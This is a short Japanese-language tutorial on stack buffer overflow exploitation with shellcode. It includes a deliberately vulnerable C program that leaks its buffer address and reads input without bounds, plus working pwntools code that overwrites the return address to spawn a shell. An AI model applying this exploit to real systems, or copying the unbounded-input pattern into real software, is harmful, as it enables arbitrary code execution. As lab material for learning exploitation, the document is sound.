# シェルコード

BOF の危険性は自由に関数を呼ばれることだけではない. 既存の関数だけでなく、攻撃者地震が作ったプログラムを動かすことができる.

## シェルコード
16進数の印字不可能文字の送信によって、バイナリの断片を送信可能.  
その断片がプログラムとして実行されることで、攻撃が行われる

## シェルコードの作成
```py
from pwn import *

shellcode = asm(
    """
    push 0x0006948;
    mov eax, 0x4;
    mov ebx, 0x1;
    mov ecx, esp;
    mov edx, 0x4;
    int 0x80
    """
    )

print(enhex(shellcode))
print(shellcraft.sh())
```

## シェルコードによる攻撃
### ターゲット
はじめから `buffer` のスタック位置が分かる.
```c
#include <stdio.h>

void vuln() {
    char buffer[128];
    printf("%p\n", buffer);
    scanf("%[^\n]", buffer);
}

int main() {
    vuln();
    printf("failed!\n");
    return 0;
}
```
### 手順
1. バッファに shellcode, offset, ret_addr を入れ込む.
2. `ret_addr` を書き換え shellcode のスタック位置を `ret` 時の `eip` に格納させる.
3. 適切な shellcode を実行する. (/bin/sh)

```
(B) - (A) = 
-------------------- (A)
shellcode
--------------------
AAA...
-------------------- 
...
-------------------- (B)
ret_addr
--------------------

```
### 必要な情報
1. `buffer` のスタックアドレス
2. `ret` 時に `eip` に格納される スタックまでのオフセット
3. 適切なシェルコード

1 は表示される.
2 は `pattc`, `patto` を利用して算出.
3 は `shellcraft.sh()` を使用.
### 攻撃コード
```py
from pwn import *

p = process("./a.out")

eip_offset = 140
shellcode = asm(shellcraft.sh())
ret_addr = p32(int(p.recvline(), 16))
num = 140 - int(len(shellcode))

payload = shellcode + b"A" * num + ret_addr

p.sendline(payload)
p.interactive()
```